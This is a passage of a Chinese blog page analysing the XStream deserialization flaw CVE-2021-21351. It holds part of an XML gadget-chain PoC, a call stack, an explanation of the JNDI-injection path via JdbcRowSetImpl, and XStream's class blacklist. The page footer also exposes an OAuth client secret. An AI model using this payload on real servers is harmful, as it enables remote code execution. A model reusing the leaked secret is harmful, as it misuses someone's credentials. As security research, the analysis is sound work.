class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>官方的POC和这个不太一致，使用后会报如下错误</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Debugging information ----</span><br><span class="line">message             : No such field com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault._overrideDefaultParser</span><br><span class="line">field               : _overrideDefaultParser</span><br><span class="line">class               : com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault</span><br><span class="line">required-type       : com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault</span><br><span class="line">converter-type      : com.thoughtworks.xstream.converters.reflection.ReflectionConverter</span><br><span class="line">path                : /sorted-set/javax.naming.ldap.Rdn$RdnEntry/value/m_DTMXRTreeFrag/m_dtm/m_mgrDefault/_overrideDefaultParser</span><br></pre></td></tr></table></figure>
+
+<p>这里表示com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault类中没有_overrideDefaultParser这个字段，于是查阅了JDK1.8_66外部包的这个类，确实没有找到该字段，于是就删除了官方POC中下面这句就得到了以上的POC</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里猜测应该是跟JDK版本有关,经查阅资料，这个属性在JDK低版本中是没有的，相关的博客也提到，可以更换成下面这句</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">__useServicesMechanism</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__useServicesMechanism</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong><br>函数调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">142</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:<span class="number">464</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">124</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:<span class="number">4067</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">parseSome:<span class="number">373</span>, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:<span class="number">312</span>, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:<span class="number">814</span>, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:<span class="number">535</span>, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:<span class="number">1294</span>, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:<span class="number">207</span>, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:<span class="number">314</span>, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:<span class="number">441</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:<span class="number">420</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:<span class="number">568</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">121</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:<span class="number">92</span>, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">72</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1409</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1388</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1273</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1264</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">81</span>, CVE202121351 (Xstream)</span><br></pre></td></tr></table></figure>
+
+<p>上面这些xml解析过程直接跳过，可以看到sorted-set里面嵌套的是两个&lt;javax.naming.ldap.Rdn_-RdnEntry&gt;，在分析CVE-2013-7258上可知，出发点在TreeMap的putAll函数，顺着来到put函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720154132.png"><br>进入到Rdn$RdnEntry的compareTo函数，将两者的value进行对比<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720153920.png"><br>然后value的值设置的是com.sun.org.apache.xpath.internal.objects.XRTreeFrag，会调用它的equal函数<br>接着一直来到XRTreeFrag的str函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">str</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> m_DTMXRTreeFrag.getDTM().getStringValue(m_dtmRoot).toString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">null</span> == str) ? <span class="string">&quot;&quot;</span> : str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过m_DTMXRTreeFrag.getDTM()函数就可以获得我们设置的m_dtm为SAX2DTM，然后调用其getStringValue函数<br>最后经过层层递进来到com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xml&#x2F;internal&#x2F;dtm&#x2F;ref&#x2F;IncrementalSAXSource_Xerces的parseSome函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720155445.png"><br>在POC中对响应的参数如fPullParserConfig设置成了类JdbcRowSetImpl，接下来就是使用JdbcRowSetImpl这个类去远程加载恶意的类造成JNDI注入了</p>
+<h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>XStream为了防护这些漏洞，直接使用黑名单的方式对可利用链的相关类进行拦截，如1.4.15中XStream.class类中的setupSecurity函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setupSecurity</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.securityMapper != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="built_in">this</span>.denyTypes(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>&#125;);</span><br><span class="line">        <span class="built_in">this</span>.denyTypesByRegExp(<span class="keyword">new</span> <span class="title class_">Pattern</span>[]&#123;LAZY_ITERATORS, JAVAX_CRYPTO, JAXWS_FILE_STREAM&#125;);</span><br><span class="line">        <span class="built_in">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="built_in">this</span>.securityInitialized = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析 (seebug.org)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/15046895.html">Java安全之XStream 漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">XStream反序列化 (y4tacker.github.io)</a><br><a target="_blank" rel="noopener" href="https://x-stream.github.io/javadoc/index.html">Overview (XStream Core 1.4.20 API) (x-stream.github.io)</a><br><a target="_blank" rel="noopener" href="https://x-stream.github.io/tutorial.html">XStream - Two Minute Tutorial (x-stream.github.io)</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11372">XSteam历史漏洞分析</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/escape-w/p/16107046.html">Xstream反序列化漏洞研究笔记 - Escape-w - 博客园 (cnblogs.com)</a></p>
+<blockquote>
+<p>注：本文首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12784">https://xz.aliyun.com/t/12784</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer"><div>
+  <div class="end-slogan" style="text-align:center;font-size:22px;letter-spacing:10px;user-seclect:none;color:#bbb">----------- 本文结束啦<i class="fa fa-star"></i>感谢您阅读-----------</div>		
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>DiliLearngent
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://dililearngent.github.io/2023/04/24/XStream/" title="Java安全之XStream漏洞分析与利用">https://dililearngent.github.io/2023/04/24/XStream/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag"># Java安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/22/SnakeYaml/" rel="prev" title="Java安全之SnakeYaml漏洞分析与利用">
+                  <i class="fa fa-chevron-left"></i> Java安全之SnakeYaml漏洞分析与利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/04/27/Log4j-security/" rel="next" title="Java安全之Log4j漏洞分析与利用">
+                  Java安全之Log4j漏洞分析与利用 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">DiliLearngent</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">101k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:08</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div><!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/20/2020 13:14:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"DiliLearngent","repo":"dililearngent.github.io","client_id":"e12e8d95c8711de863a8","client_secret":"22368c9ebad498682ec51031519e47b96c45ee7c","admin_user":"DiliLearngent","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"521b5023ee4aec3c6fd8f0287bf45067"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+</body>
+</html>
